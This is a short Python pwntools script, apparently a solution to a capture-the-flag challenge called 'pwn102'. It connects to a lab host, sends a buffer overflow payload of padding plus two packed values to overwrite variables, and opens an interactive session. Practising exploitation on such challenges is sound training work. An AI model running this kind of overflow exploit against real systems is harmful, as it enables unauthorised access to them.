#!/usr/bin/env python3
from pwn import *

#io = process('./pwn102.pwn102')

#context.log_level= 'DEBUG'
io = remote('10.10.53.32', 9001) 

payload = b"A"*104 + p32(0xc0d3) + p32(0xc0ff33)

io.recv()
io.sendline(payload)
io.interactive()
